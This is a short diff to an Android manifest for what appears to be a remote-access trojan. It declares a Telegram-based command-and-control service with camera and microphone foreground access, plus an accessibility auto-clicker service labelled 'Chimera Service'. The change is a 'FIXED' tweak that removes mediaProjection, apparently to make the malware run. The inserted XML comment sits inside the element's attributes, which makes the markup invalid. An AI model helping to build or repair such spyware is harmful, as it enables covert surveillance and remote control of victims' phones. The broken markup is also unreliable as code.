@@ -40,7 +40,8 @@
         <service
             android:name=".TelegramC2Service"
             android:exported="false"
-            android:foregroundServiceType="dataSync|camera|microphone|mediaProjection" />
+            <!-- FIXED: Removed mediaProjection from the initial declaration -->
+            android:foregroundServiceType="dataSync|camera|microphone" />
 
         <service android:name=".AutoClickerAccessibilityService"
             android:label="Chimera Service"
